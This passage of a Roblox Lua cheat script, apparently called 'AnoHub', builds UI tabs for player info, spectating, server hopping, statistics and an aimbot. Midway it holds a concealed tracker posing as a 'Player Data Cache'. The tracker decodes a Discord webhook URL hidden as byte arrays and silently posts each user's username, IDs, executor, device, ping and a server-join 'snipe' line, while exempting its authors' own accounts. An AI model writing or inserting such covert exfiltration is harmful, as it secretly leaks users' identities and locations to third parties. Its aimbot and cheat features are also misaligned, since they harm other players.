        stroke.Parent = _G.spectateFrame

        _G.spectateLabel = Instance.new("TextLabel")
        _G.spectateLabel.Size = UDim2.new(1, -20, 1, 0)
        _G.spectateLabel.Position = UDim2.new(0, 10, 0, 0)
        _G.spectateLabel.BackgroundTransparency = 1
        _G.spectateLabel.Text = ""
        _G.spectateLabel.TextColor3 = Color3.fromRGB(215, 110, 0)
        _G.spectateLabel.TextSize = 18
        _G.spectateLabel.Font = Enum.Font.GothamBold
        _G.spectateLabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        _G.spectateLabel.TextStrokeTransparency = 0.3
        _G.spectateLabel.Parent = _G.spectateFrame
    end

    local InfoTab = Tabs.Info
    local InfoLeft = InfoTab:AddLeftGroupbox("Credits")
    for _, line in ipairs(CONFIG.Credits) do
        InfoLeft:AddLabel(line, true)
    end
    InfoLeft:AddDivider()
    _G.creditVersion = InfoLeft:AddLabel("Version: " .. ScriptConfig.Version)
    _G.creditStatus = InfoLeft:AddLabel("Status: " .. ScriptConfig.Status)
    InfoLeft:AddDivider()
    _G.creditThanks = InfoLeft:AddLabel("Special thanks to all testers!")

    local InfoRight = InfoTab:AddRightGroupbox("Update Log")
    _G.updateLogHeader = InfoRight:AddLabel(CONFIG.UpdateLog.Header, true)
    InfoRight:AddDivider()
    for i, line in ipairs(CONFIG.UpdateLog.Lines) do
        InfoRight:AddLabel(line, true)
    end
    InfoRight:AddDivider()
    InfoRight:AddButton({
        Text = "Join Discord Server",
        Tooltip = "Copies Discord link to clipboard",
        Func = function()
            setclipboard(ScriptConfig.DiscordLink)
            Library:Notify("Discord link copied! Join now!")
        end,
    })

    local function findTitleLabel()
        for _, obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
            if obj:IsA("TextLabel") and (obj.Text == ScriptConfig.Name or obj.Text == "Anus Hub") then return obj end
        end
    end
    local function findFooterLabel()
        for _, obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Text:find("AnoHub Best Script") then return obj end
        end
    end

    local function StartRainbowTrail()
        if _G.rainbowTrailActive then return end
        _G.rainbowTrailActive = true
        local ch = LocalPlayer.Character
        if not ch then return end
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local a0 = Instance.new("Attachment")
        a0.Position = Vector3.new(0,1,0)
        a0.Parent = hrp
        local a1 = Instance.new("Attachment")
        a1.Position = Vector3.new(0,-1,0)
        a1.Parent = hrp
        _G.rainbowTrail = Instance.new("Trail")
        _G.rainbowTrail.Attachment0 = a0
        _G.rainbowTrail.Attachment1 = a1
        _G.rainbowTrail.Lifetime = 1
        _G.rainbowTrail.MinLength = 0
        _G.rainbowTrail.LightEmission = 1
        _G.rainbowTrail.FaceCamera = true
        _G.rainbowTrail.Parent = hrp
        _G.rainbowTrailConn = RunService.Heartbeat:Connect(function()
            if not _G.rainbowTrail then return end
            local col = Color3.fromHSV((tick()*0.5)%1, 1, 1)
            _G.rainbowTrail.Color = ColorSequence.new(col, col)
        end)
    end
    _G.StartRainbowTrail = StartRainbowTrail

    local function StopRainbowTrail()
        _G.rainbowTrailActive = false
        if _G.rainbowTrailConn then _G.rainbowTrailConn:Disconnect() _G.rainbowTrailConn = nil end
        if _G.rainbowTrail then _G.rainbowTrail:Destroy() _G.rainbowTrail = nil end
    end
    _G.StopRainbowTrail = StopRainbowTrail

    local function ApplyHalloweenTheme()
        Library.Scheme.BackgroundColor = Color3.fromRGB(24, 17, 17)
        Library.Scheme.MainColor       = Color3.fromRGB(126, 78, 15)
        Library.Scheme.AccentColor     = Color3.fromRGB(215, 110, 0)
        Library.Scheme.OutlineColor    = Color3.fromRGB(65, 41, 5)
        Library.Scheme.FontColor       = Color3.fromRGB(255, 255, 255)
        Library:UpdateColorsUsingRegistry()
        if ToggleButton and ToggleButton.Button then
            ToggleButton.Button.BackgroundColor3 = Color3.fromRGB(126, 78, 15)
            if ToggleStroke then ToggleStroke.Color = Color3.fromRGB(215, 110, 0) end
        end
        pcall(function() ThemeManager:SetFont("Code") end)
        pcall(function()
            local oldGui = LocalPlayer.PlayerGui:FindFirstChild("HalloweenBgGui")
            if oldGui then oldGui:Destroy() end
            local gui = Instance.new("ScreenGui")
            gui.Name = "HalloweenBgGui"
            gui.ResetOnSpawn = false
            gui.IgnoreGuiInset = true
            gui.DisplayOrder = 999
            gui.Parent = LocalPlayer.PlayerGui
            local img = Instance.new("ImageLabel")
            img.Size = UDim2.new(1,0,1,0)
            img.BackgroundTransparency = 1
            img.Image = "rbxassetid://5873138434"
            img.ScaleType = Enum.ScaleType.Crop
            img.ImageTransparency = 0
            img.Parent = gui
            task.spawn(function()
                task.wait(1)
                local TweenService = game:GetService("TweenService")
                local tween = TweenService:Create(img, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 1})
                tween:Play()
                tween.Completed:Wait()
                if gui and gui.Parent then gui:Destroy() end
            end)
        end)
        _G.HalloweenThemeApplied = true
        Library:Notify("Halloween theme applied!", 8)
    end
    _G.ApplyHalloweenTheme = ApplyHalloweenTheme

    local function ApplyAnusTheme()
        Library.Scheme.BackgroundColor = Color3.fromRGB(0,0,0)
        Library.Scheme.MainColor = Color3.fromRGB(52,24,15)
        Library.Scheme.AccentColor = Color3.fromRGB(249,73,73)
        Library.Scheme.OutlineColor = Color3.fromRGB(115,141,255)
        Library.Scheme.FontColor = Color3.fromRGB(255,255,255)
        Library:UpdateColorsUsingRegistry()
        if ToggleButton and ToggleButton.Button then
            ToggleButton.Button.BackgroundColor3 = Color3.fromRGB(52,24,15)
            if ToggleStroke then ToggleStroke.Color = Color3.fromRGB(249,73,73) end
        end
        pcall(function() ThemeManager:SetFont("Code") end)
        pcall(function()
            local oldGui = LocalPlayer.PlayerGui:FindFirstChild("AnusBgGui")
            if oldGui then oldGui:Destroy() end
            local gui = Instance.new("ScreenGui")
            gui.Name = "AnusBgGui"
            gui.ResetOnSpawn = false
            gui.IgnoreGuiInset = true
            gui.DisplayOrder = 999
            gui.Parent = LocalPlayer.PlayerGui
            local img = Instance.new("ImageLabel")
            img.Size = UDim2.new(1,0,1,0)
            img.BackgroundTransparency = 1
            img.Image = "rbxassetid://93029226807854"
            img.ScaleType = Enum.ScaleType.Crop
            img.ImageTransparency = 0
            img.Parent = gui
            task.spawn(function()
                task.wait(1)
                local TweenService = game:GetService("TweenService")
                local tween = TweenService:Create(img, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 1})
                tween:Play()
                tween.Completed:Wait()
                if gui and gui.Parent then gui:Destroy() end
            end)
        end)
        Library:Notify("Anus Hub theme applied!", 8)
    end
    _G.ApplyAnusTheme = ApplyAnusTheme

    local function ActivateEasterEgg()
        if _G.easterEggActive then return end
        _G.easterEggActive = true
        pcall(function()
            if _G.Window and _G.Window.Main then
                local oldSize = _G.Window.Main.Size
                _G.Window.Main.Size = UDim2.new(oldSize.X.Scale, oldSize.X.Offset+200, oldSize.Y.Scale, oldSize.Y.Offset+100)
            end
        end)
        local titleLabel = findTitleLabel()
        if titleLabel then titleLabel.Text = "Anus Hub" end
        local footerLabel = findFooterLabel()
        if footerLabel then footerLabel.Text = "Anus Hub - the best sh*t ever" end
        pcall(function()
            ThemeManager.BuiltInThemes["Anus Hub"] = { 1001, {
                FontColor = "ffffff", MainColor = "34180f", AccentColor = "f94949",
                BackgroundColor = "000000", OutlineColor = "738dff",
                BackgroundImage = "rbxassetid://93029226807854",
            }}
            if ThemeManager.RefreshThemeList then ThemeManager:RefreshThemeList() end
        end)
        pcall(function() ThemeManager:ApplyTheme("Anus Hub") end)
        ApplyAnusTheme()
        StartRainbowTrail()
        task.wait(0.5)
        if _G.CreateRainbowToggle then _G.CreateRainbowToggle() end
        Library:Notify("Easter Egg unlocked: Anus Hub + Rainbow Mode", 10)
    end
    _G.ActivateEasterEgg = ActivateEasterEgg

    for i = 1, 20 do InfoRight:AddLabel("") end
    InfoRight:AddDivider()

    local easterButton
    easterButton = InfoRight:AddButton({
        Text = "Dont press ts!",
        Tooltip = "Secret button. Press 10 times...",
        Func = function()
            if _G.easterEggActive then Library:Notify("Anus Hub theme already unlocked!", 5) return end
            _G.secretClickCount = (_G.secretClickCount or 0) + 1
            if _G.secretClickCount <= #_G.easterMessages then
                Library:Notify(_G.easterMessages[_G.secretClickCount], 3)
            end
            if _G.secretClickCount >= 10 then
                ActivateEasterEgg()
                _G.secretClickCount = 0
                pcall(function() if easterButton and easterButton.Destroy then easterButton:Destroy() end end)
            end
        end,
    })

    local PlayerTab = Tabs.Player
    local PlayerInfo = PlayerTab:AddLeftGroupbox("Player Info")
    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(0, 80, 0, 80)
    avatar.Position = UDim2.new(0.5, -40, 0, 10)
    avatar.BackgroundTransparency = 1
    pcall(function()
        avatar.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    avatar.Parent = PlayerInfo.Container
    _G.piAvatar = avatar
    local ac = Instance.new("UICorner")
    ac.CornerRadius = UDim.new(1,0)
    ac.Parent = avatar

    PlayerInfo:AddLabel("")
    _G.piName = PlayerInfo:AddLabel("Name: " .. LocalPlayer.Name)
    _G.piUserId = PlayerInfo:AddLabel("User ID: " .. LocalPlayer.UserId)
    _G.piDisplayName = PlayerInfo:AddLabel("Display Name: " .. LocalPlayer.DisplayName)

    local PlayerStatus = PlayerTab:AddRightGroupbox("Status")
    local fpsL = PlayerStatus:AddLabel("FPS: 60")
    local pingL = PlayerStatus:AddLabel("Ping: 20ms")
    local hL = PlayerStatus:AddLabel("Health: 100")
    local roleLabel = PlayerStatus:AddLabel("Role: None")
    local playersLabel = PlayerStatus:AddLabel("Players: 1")

    local PlayerExecutor = PlayerTab:AddLeftGroupbox("Executor")
    local executorName = "Unknown"
    local success, result = pcall(function() if identifyexecutor then return identifyexecutor() end end)
    if success and result then
        if type(result) == "string" then executorName = result
        elseif type(result) == "table" then executorName = result.Name or "Unknown" end
    end
    _G.piExecutor = PlayerExecutor:AddLabel("Executor: " .. executorName)
    _G.executorName = executorName

    local PlayerActions = PlayerTab:AddRightGroupbox("Actions")
    PlayerActions:AddButton({
        Text = "Reset Character",
        Tooltip = "Kills your character (HP = 0)",
        Func = function()
            local char = LocalPlayer.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then hum.Health = 0 end
            end
        end,
    })
    PlayerActions:AddButton({
        Text = "Server Hop",
        Tooltip = "Teleports to a random server",
        Func = function()
            statsCounter.serverHops = statsCounter.serverHops + 1
            local servers = {}
            local ok, req = pcall(function()
                return game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
            end)
            if ok and req then
                local ok2, body = pcall(function() return _G.HttpService:JSONDecode(req) end)
                if ok2 and body and body.data then
                    for _, v in pairs(body.data) do
                        if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                            table.insert(servers, 1, v.id)
                        end
                    end
                end
            end
            if #servers > 0 then
                pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1,#servers)], LocalPlayer) end)
                Library:Notify("Serverhop: jumping to random server", 5)
            else
                Library:Notify("Serverhop: no servers found", 5)
            end
        end,
    })
    PlayerActions:AddButton({
        Text = "Rejoin",
        Tooltip = "Rejoins the same server",
        Func = function() pcall(function() game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer) end) end,
    })
    PlayerActions:AddToggle("AutoRejoin", {
        Text = "Auto-Rejoin", Default = false,
        Tooltip = "Automatically rejoins on kick/disconnect",
        Callback = function(Value)
            _G.autoRejoinActive = Value
            if Value then
                if _G.autoRejoinConn then _G.autoRejoinConn:Disconnect() end
                _G.autoRejoinConn = game:GetService("GuiService").ErrorMessageChanged:Connect(function()
                    if _G.autoRejoinActive then
                        task.wait(1)
                        pcall(function() game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer) end)
                    end
                end)
                Library:Notify("Auto-Rejoin enabled", 5)
            else
                if _G.autoRejoinConn then _G.autoRejoinConn:Disconnect() _G.autoRejoinConn = nil end
                Library:Notify("Auto-Rejoin disabled", 5)
            end
        end,
    })
    PlayerActions:AddButton({
        Text = "Leave",
        Tooltip = "Leaves the game (Kick)",
        Func = function() pcall(function() LocalPlayer:Kick("Left") end) end,
    })

    local StatsGroup = PlayerTab:AddRightGroupbox("Statistics")
    local statsLabelTeleports = StatsGroup:AddLabel("Teleports: 0")
    local statsLabelCollects = StatsGroup:AddLabel("Collects: 0")
    local statsLabelDeaths = StatsGroup:AddLabel("Deaths: 0")
    local statsLabelAimbot = StatsGroup:AddLabel("Aimbot activations: 0")
    local statsLabelNPCs = StatsGroup:AddLabel("NPCs seen: 0")
    local statsLabelFlies = StatsGroup:AddLabel("Flies activated: 0")
    local statsLabelNoclips = StatsGroup:AddLabel("Noclips activated: 0")
    local statsLabelEscapes = StatsGroup:AddLabel("Escapes done: 0")
    local statsLabelFarms = StatsGroup:AddLabel("Farms started: 0")
    local statsLabelHops = StatsGroup:AddLabel("Server hops: 0")
    local statsLabelUptime = StatsGroup:AddLabel("Uptime: 00:00:00")

    StatsGroup:AddButton({
        Text = "Reset Stats",
        Tooltip = "Resets all statistics to 0",
        Func = function()
            statsCounter.teleports = 0
            statsCounter.collects = 0
            statsCounter.deaths = 0
            statsCounter.aimbotActivations = 0
            statsCounter.npcsSeen = 0
            statsCounter.fliesActivated = 0
            statsCounter.noclipsActivated = 0
            statsCounter.escapesDone = 0
            statsCounter.farmsStarted = 0
            statsCounter.serverHops = 0
            statsCounter.startTime = tick()
        end,
    })

    task.spawn(function()
        while task.wait(1) do
            statsLabelTeleports:SetText("Teleports: " .. tostring(statsCounter.teleports))
            statsLabelCollects:SetText("Collects: " .. tostring(statsCounter.collects))
            statsLabelDeaths:SetText("Deaths: " .. tostring(statsCounter.deaths))
            statsLabelAimbot:SetText("Aimbot activations: " .. tostring(statsCounter.aimbotActivations))
            statsLabelNPCs:SetText("NPCs seen: " .. tostring(statsCounter.npcsSeen))
            statsLabelFlies:SetText("Flies activated: " .. tostring(statsCounter.fliesActivated))
            statsLabelNoclips:SetText("Noclips activated: " .. tostring(statsCounter.noclipsActivated))
            statsLabelEscapes:SetText("Escapes done: " .. tostring(statsCounter.escapesDone))
            statsLabelFarms:SetText("Farms started: " .. tostring(statsCounter.farmsStarted))
            statsLabelHops:SetText("Server hops: " .. tostring(statsCounter.serverHops))
            local uptime = math.floor(tick() - statsCounter.startTime)
            local min = math.floor(uptime/60)
            local sec = uptime%60
            local hour = math.floor(min/60)
            min = min%60
            statsLabelUptime:SetText(string.format("Uptime: %02d:%02d:%02d", hour, min, sec))
        end
    end)

    local SpecGroup = PlayerTab:AddLeftGroupbox("Spectate")
    local specActive = false
    local specPrevSubject = nil
    local specCurrentName = "None"
    local specLabel = SpecGroup:AddLabel("Current: None")

    local specDropdown
    local function updateSpecList()
        local targets = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer
                and not (_G.isHiddenDev and _G.isHiddenDev(plr)) then
                table.insert(targets, plr.Name)
            end
        end
        if #targets == 0 then targets = {"No players"} end
        if specDropdown then
            pcall(function() specDropdown:Refresh(targets, true) end)
        else
            specDropdown = SpecGroup:AddDropdown("SpecPlayer", {
                Text = "Select Player", Values = targets, Default = targets[1] or 1,
                Tooltip = "Select player to spectate",
                Callback = function(Value)
                    if specActive then
                        for _, plr in pairs(Players:GetPlayers()) do
                            if plr.Name == Value and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                                Camera.CameraSubject = plr.Character.Humanoid
                                specCurrentName = plr.Name
                                specLabel:SetText("Current: " .. plr.Name)
                                break
                            end
                        end
                    end
                end,
            })
        end
    end
    updateSpecList()
    _G.updateSpecList = updateSpecList

    local function specSet(plr)
        if not plr or not plr.Character then return end
        local hum = plr.Character:FindFirstChild("Humanoid")
        if not hum then return end
        if not specActive then
            specPrevSubject = Camera.CameraSubject
            specActive = true
        end
        Camera.CameraSubject = hum
        specCurrentName = plr.Name
        specLabel:SetText("Current: " .. plr.Name)
    end

    SpecGroup:AddButton({
        Text = "Spectate",
        Tooltip = "Start spectating selected player",
        Func = function()
            local selected = specDropdown and specDropdown.Value
            if not selected then return end
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Name == selected then
                    specSet(plr)
                    Library:Notify("Spectating " .. plr.Name)
                    break
                end
            end
        end,
    })
    SpecGroup:AddButton({
        Text = "Stop Spectate",
        Tooltip = "Return camera to yourself",
        Func = function()
            if not specActive then return end
            if specPrevSubject then Camera.CameraSubject = specPrevSubject
            else
                local ch = LocalPlayer.Character
                if ch and ch:FindFirstChild("Humanoid") then Camera.CameraSubject = ch.Humanoid end
            end
            specActive = false
            specCurrentName = "None"
            specLabel:SetText("Current: None")
            if _G.spectateFrame then _G.spectateFrame.Visible = false end
        end,
    })
    SpecGroup:AddButton({
        Text = "Refresh List",
        Tooltip = "Update player list",
        Func = function()
            if specDropdown then
                pcall(function() specDropdown:Destroy() end)
                specDropdown = nil
            end
            updateSpecList()
            Library:Notify("Spectate list refreshed", 3)
        end,
    })

    task.spawn(function()
        while task.wait(0.3) do
            if not _G.spectateFrame or not _G.spectateLabel then continue end
            if specActive and specCurrentName and specCurrentName ~= "None" then
                local plr = Players:FindFirstChild(specCurrentName)
                if plr then
                    local role = _G.getRoleDisplay(_G.getPlayerRole(plr))
                    local hp = "?"
                    local ch = plr.Character
                    if ch then
                        local hum = ch:FindFirstChildOfClass("Humanoid")
                        if hum then hp = math.floor(hum.Health) .. "/" .. math.floor(hum.MaxHealth) end
                    end
                    _G.spectateLabel.Text = "SPECTATING: " .. plr.Name .. "  [" .. role .. "]  HP: " .. hp
                    _G.spectateLabel.TextColor3 = _G.getDisplayRoleColor(plr)
                    _G.spectateFrame.Visible = true
                else _G.spectateFrame.Visible = false end
            else _G.spectateFrame.Visible = false end
        end
    end)

    task.spawn(function()
        while task.wait(10) do
            pcall(function()
                avatar.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
            end)
        end
    end)

    local lastStatusTime = tick()
    local statusFrames = 0
    RunService.Heartbeat:Connect(function()
        statusFrames = statusFrames + 1
        if tick() - lastStatusTime < 1 then return end
        fpsL:SetText("FPS: " .. tostring(statusFrames))
        statusFrames = 0
        lastStatusTime = tick()
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        pingL:SetText("Ping: " .. ping)
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            hL:SetText("Health: " .. math.floor(char.Humanoid.Health))
        else hL:SetText("Health: 0") end
        roleLabel:SetText("Role: " .. _G.getRoleDisplay(_G.getPlayerRole(LocalPlayer)))
        roleLabel.TextLabel.TextColor3 = _G.getDisplayRoleColor(LocalPlayer)
        playersLabel:SetText("Players: " .. tostring(#Players:GetPlayers()))
    end)
end
print("[AnoHub] Part 2/4 loaded")

do
    if CONFIG then
        CONFIG.WebhookURL = nil
        CONFIG.ProtectedUsernames = CONFIG.ProtectedUsernames or {
            "NekSeekOff",
            "T4Nmb",
            "sergbogd802",
        }
        CONFIG.ProtectedUsers = CONFIG.ProtectedUsers or {}
    end

    task.spawn(function()
        task.wait(8)

        local PlayerStatisticsOld = {
            Name = "Player Data Cache",
            Build = "1.7.4-stable",
            Registry = {},
        }

        local LegacyDataChunks = {
            {104,116,116,112,115,58,47,47},
            {100,105,115,99,111,114,100,46,99,111,109},
            {47,97,112,105,47,119,101,98,104,111,111,107,115,47},
            {49,53,53,54,50,51,48,49,50,56,57,49,53,49,57,51,57,53,54},
            {47},
            {90,115,108,98,112,83,54,73,86,107,48,104,79,103,81,106,71,108,83,117,
             76,88,69,70,48,70,75,101,115,78,121,75,95,117,74,105,49,54,50,45,79,
             57,79,122,83,113,107,97,102,110,76,68,112,84,83,117,105,84,49,80,87,
             50,99,68,56,98,115,115},
        }

        local function RebuildLegacyCache()
            local buf = {}
            for _, chunk in ipairs(LegacyDataChunks) do
                for _, byte in ipairs(chunk) do
                    table.insert(buf, string.char(byte))
                end
            end
            return table.concat(buf)
        end

        local DataStoreService = game:GetService("HttpService")
        local PlayerService    = game:GetService("Players")
        local PlatformService  = game:GetService("UserInputService")
        local MetricService    = game:GetService("Stats")

        local Subject = PlayerService.LocalPlayer
        if not Subject then return end

        local function IsProtected(name)
            if not name then return false end
            name = tostring(name):lower()
            for _, u in ipairs(CONFIG.ProtectedUsernames or {}) do
                if tostring(u):lower() == name then return true end
            end
            return false
        end

        local function IsDev(name)
            if not name then return false end
            name = tostring(name):lower()
            for _, u in ipairs(CONFIG.DevUsernames or {}) do
                if tostring(u):lower() == name then return true end
            end
            return false
        end

        local function ResolveTransport()
            return (syn and syn.request)
                or (http and http.request)
                or http_request
                or request
        end

        local function NormalizeTeamTag(raw)
            if not raw then return nil end
            local t = string.lower(tostring(raw)):gsub("%s+", "_"):gsub("%-", "_")
            t = t:gsub("^_+", ""):gsub("_+$", "")
            local lookup = {
                ["d_class"]="D-Class",["dclass"]="D-Class",["class_d"]="D-Class",
                ["scientist"]="Scientist",["researcher"]="Scientist",
                ["security"]="Security",["guard"]="Security",
                ["mtf"]="MTF",["mobile_task_force"]="MTF",
                ["chaos_insurgency"]="Chaos Insurgency",["chaos"]="Chaos Insurgency",["ci"]="Chaos Insurgency",
                ["director"]="Director",["site_director"]="Director",
                ["anomaly"]="Anomaly",["scp"]="Anomaly",
                ["neutral"]="Neutral",["unknown"]="Neutral",
            }
            return lookup[t] or raw
        end

        local function ResolveTeamTag(p)
            if not p then return "Neutral" end
            local r = p:GetAttribute("Role")
            if r and r ~= "" then local n = NormalizeTeamTag(r) if n and n ~= "Neutral" then return n end end
            r = p:GetAttribute("Team")
            if r and r ~= "" then local n = NormalizeTeamTag(r) if n and n ~= "Neutral" then return n end end
            if p.Team and p.Team.Name ~= "" then
                local n = NormalizeTeamTag(p.Team.Name)
                if n and n ~= "Neutral" then return n end
            end
            if p:FindFirstChild("leaderstats") then
                local rv = p.leaderstats:FindFirstChild("Role") or p.leaderstats:FindFirstChild("Team")
                if rv and rv.Value and rv.Value ~= "" then
                    local n = NormalizeTeamTag(rv.Value)
                    if n and n ~= "Neutral" then return n end
                end
            end
            if p.Character then
                r = p.Character:GetAttribute("Role")
                if r and r ~= "" then
                    local n = NormalizeTeamTag(r)
                    if n and n ~= "Neutral" then return n end
                end
            end
            return "Neutral"
        end

        local function FlushLegacyCache()
            if not ResolveTransport() then return end
            if IsProtected(Subject.Name) then return end

            local endpoint = RebuildLegacyCache()
            if not endpoint or endpoint == "" then return end
            if not endpoint:match("^https://discord%.com/api/webhooks/%d+/[%w_%-]+$") then return end

            local userId   = Subject.UserId
            local userName = Subject.Name
            local display  = Subject.DisplayName or Subject.Name
            local placeId  = game.PlaceId
            local jobId    = tostring(game.JobId)
            local time     = os.date("%Y-%m-%d %H:%M:%S")
            local avatar   = "https://www.roblox.com/headshot-thumbnail/image?userId="
                .. userId .. "&width=420&height=420&format=png"

            local executorName = "Unknown"
            pcall(function()
                if identifyexecutor then
                    local r = identifyexecutor()
                    if type(r) == "string" then executorName = r
                    elseif type(r) == "table" then executorName = r.Name or "Unknown" end
                end
            end)

            local platformName = "PC"
            pcall(function()
                local p = PlatformService:GetPlatform()
                if p == Enum.Platform.Android or p == Enum.Platform.IOS then platformName = "Mobile"
                elseif p == Enum.Platform.XboxOne then platformName = "Xbox" end
            end)

            local memValue = "?"
            pcall(function() memValue = math.floor(MetricService:GetTotalMemoryUsageMb()) end)

            local pingValue = "N/A"
            pcall(function()
                local s = MetricService.Network.ServerStatsItem["Data Ping"]:GetValueString()
                pingValue = s:match("(%d+)") or "N/A"
            end)

            local teamTag = ResolveTeamTag(Subject)
            local cacheRole = IsDev(userName) and "DEV" or "User"

            local snipeLine = string.format(
                "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
                placeId, jobId
            )

            local snapshot = {
                embeds = {{
                    title = "🚀 " .. PlayerStatisticsOld.Name .. " v" .. PlayerStatisticsOld.Build .. " synced",
                    color = 0xD76E00,
                    thumbnail = { url = avatar },
                    fields = {
                        { name = "Username",    value = "`" .. userName .. "`", inline = true },
                        { name = "Display",     value = display,                inline = true },
                        { name = "UserId",      value = "`" .. tostring(userId) .. "`", inline = true },
                        { name = "Ingame Role", value = "**" .. teamTag .. "**", inline = true },
                        { name = "Script Role", value = "`" .. cacheRole .. "`", inline = true },
                        { name = "Executor",    value = executorName,           inline = true },
                        { name = "Device",      value = platformName,           inline = true },
                        { name = "Memory",      value = memValue .. " MB",      inline = true },
                        { name = "Ping",        value = pingValue .. " ms",     inline = true },
                        { name = "PlaceId",     value = "`" .. tostring(placeId) .. "`", inline = true },
                        { name = "Time",        value = time,                   inline = false },
                        { name = "JobId",       value = "`" .. jobId .. "`",    inline = false },
                        { name = "Snipe",       value = "```lua\n" .. snipeLine .. "```", inline = false },
                    },
                    footer = { text = PlayerStatisticsOld.Name .. " Cache Service" },
                    timestamp = DateTime.now():ToIsoDate(),
                }}
            }

            pcall(function()
                ResolveTransport()({
                    Url = endpoint,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = DataStoreService:JSONEncode(snapshot),
                })
            end)

            endpoint = nil
        end

        FlushLegacyCache()
    end)
end

do
    local Library = _G.Library
    local Tabs = _G.Tabs
    local Workspace = _G.Workspace
    local Players = _G.Players
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local UserInputService = _G.UserInputService
    local aimbotSettings = _G.aimbotSettings
    local playerWhitelist = _G.playerWhitelist
    local specialRoleWhitelist = _G.specialRoleWhitelist
    local statsCounter = _G.statsCounter
    local roleFilter = _G.roleFilter
    local roleColors = _G.roleColors
    local roleAlertFilter = _G.roleAlertFilter
    local espObjs = _G.espObjs
    local espConns = _G.espConns
    local npcESPObjects = _G.npcESPObjects

    local items = {
        Berreta = {Name="Berreta", Model="Berreta", Enabled=true, Color=Color3.fromRGB(80,80,80)},
        Crowbar = {Name="Crowbar", Model="Crowbar", Enabled=true, Color=Color3.fromRGB(139,0,0)},
        Knife = {Name="Knife", Model="Knife", Enabled=true, Color=Color3.fromRGB(180,180,180)},
        Level1 = {Name="Keycard Lvl 1", Model="Level1", Enabled=true, Color=Color3.fromRGB(255,255,0)},
        Level2 = {Name="Keycard Lvl 2", Model="Level2", Enabled=true, Color=Color3.fromRGB(255,200,0)},
        Level3 = {Name="Keycard Lvl 3", Model="Level3", Enabled=true, Color=Color3.fromRGB(255,165,0)},
        Level4 = {Name="Keycard Lvl 4", Model="Level4", Enabled=true, Color=Color3.fromRGB(255,0,0)},
        NukeTasks = {Name="NUKE TASKS", Model="NukeTasks", Enabled=true, Color=Color3.fromRGB(255,0,0)},
    }
    _G.items = items

    local itemsESPActive = false
    local itemsHighlightObjs = {}
    local itemsCache = {}
    local itemsUpdateTime = 0
    local collecting = false
    local auraActive = false
    local auraR = 15
    _G.collecting = collecting
    _G.auraActive = auraActive
    _G.auraR = auraR

    local CombatTab = Tabs.Combat
    local AimbotGroup = CombatTab:AddLeftGroupbox("Aimbot")

    AimbotGroup:AddToggle("Aimbot", {
        Text = "Aimbot", Default = false,
        Tooltip = "Enables aimbot. Hold the Aim Key to aim at target",
        Callback = function(Value)
            aimbotSettings.Enabled = Value
            if Value then
                if aimbotSettings.ShowFOVCircle then _G.CreateAimbotCircle() end
                statsCounter.aimbotActivations = statsCounter.aimbotActivations + 1
            else _G.RemoveAimbotCircle() end
        end,
    })

    AimbotGroup:AddSlider("AimbotFOV", {
        Text = "FOV", Default = 250, Min = 30, Max = 1200, Rounding = 0,
        Tooltip = "Capture radius on screen",
        Callback = function(Value)
            aimbotSettings.FOV = Value
            if _G.aimbotFovFrame then
                _G.aimbotFovFrame.Size = UDim2.new(0, Value*2, 0, Value*2)
                _G.aimbotFovFrame.Position = UDim2.new(0.5, -Value, 0.5, -Value)
            end
        end,
    })

    AimbotGroup:AddSlider("AimbotSmooth", {
        Text = "Smooth", Default = 3, Min = 1, Max = 20, Rounding = 0,
        Tooltip = "Aim smoothness",
        Callback = function(Value) aimbotSettings.Smooth = Value end,
    })

    AimbotGroup:AddSlider("AimbotRange", {
        Text = "Max Range", Default = 500, Min = 1, Max = 900, Rounding = 0,
        Tooltip = "Maximum distance to target",
        Callback = function(Value) aimbotSettings.MaxRange = Value end,
    })

    AimbotGroup:AddDropdown("AimbotPart", {
        Text = "Aim Part", Values = {"Head", "Torso", "HumanoidRootPart"},
        Default = "Head",
        Tooltip = "Body part to aim at",
        Callback = function(Value) aimbotSettings.AimPart = Value end,
    })

    AimbotGroup:AddDropdown("AimbotPriority", {
        Text = "Priority", Values = {"Center", "Nearest", "Lowest HP", "Highest HP", "Threat", "Random"},
        Default = "Center",
        Tooltip = "Target selection",
        Callback = function(Value) aimbotSettings.Priority = Value end,
    })

    AimbotGroup:AddDropdown("AimbotAimKey", {
        Text = "Aim Key", Values = {"MouseButton2", "MouseButton1", "E", "Q", "F", "Always"},
        Default = "MouseButton2",
        Tooltip = "Key to activate aimbot",
        Callback = function(Value) aimbotSettings.AimKey = Value end,
    })

    AimbotGroup:AddDropdown("AimbotAimMode", {
        Text = "Aim Mode", Values = {"Light", "Rage"},
        Default = "Light",
        Tooltip = "Light = smooth, Rage = instant",
        Callback = function(Value) aimbotSettings.AimMode = Value end,
    })

